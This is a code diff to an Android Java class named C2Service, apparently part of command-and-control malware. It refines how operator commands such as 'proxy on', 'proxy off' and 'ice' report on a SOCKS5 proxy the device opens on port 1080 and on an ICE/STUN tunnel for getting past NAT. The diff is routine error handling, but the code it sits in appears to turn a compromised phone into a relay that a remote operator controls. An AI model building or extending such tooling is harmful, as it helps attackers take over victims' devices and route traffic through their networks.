@@ -91,12 +91,16 @@ public class C2Service extends Service {
         if (cmd.equalsIgnoreCase("proxy on")) {
             proxyService.startProxy();
             juiceService.startTunnel();
-            return "✅ SOCKS5 proxy started on port 1080\n✅ ICE/STUN NAT traversal started\n\n📋 ICE Info:\n" + juiceService.getIceInfo();
+            String iceInfo = juiceService.getIceInfo();
+            if (iceInfo.isEmpty()) {
+                return "✅ SOCKS5 proxy started on port 1080\n⚠️ ICE info not available. Use local IP if on same network.";
+            }
+            return "✅ SOCKS5 proxy started on port 1080\n✅ ICE/STUN NAT traversal started\n\n📋 ICE Info:\n" + iceInfo;
         }
         if (cmd.equalsIgnoreCase("proxy off")) {
             proxyService.stopProxy();
             juiceService.stopTunnel();
-            return "❌ Proxy stopped\n❌ ICE/STUN stopped";
+            return "❌ Proxy stopped";
         }
         if (cmd.equalsIgnoreCase("proxy status")) {
             String status = proxyService.isRunning() ? "✅ Proxy running on port 1080" : "❌ Proxy stopped";
@@ -108,7 +112,8 @@ public class C2Service extends Service {
         }
 
         if (cmd.equalsIgnoreCase("ice")) {
-            return "📋 ICE Info:\n" + juiceService.getIceInfo();
+            String iceInfo = juiceService.getIceInfo();
+            return iceInfo.isEmpty() ? "❌ ICE info not available" : "📋 ICE Info:\n" + iceInfo;
         }
 
         if (cmd.equalsIgnoreCase("ip")) {
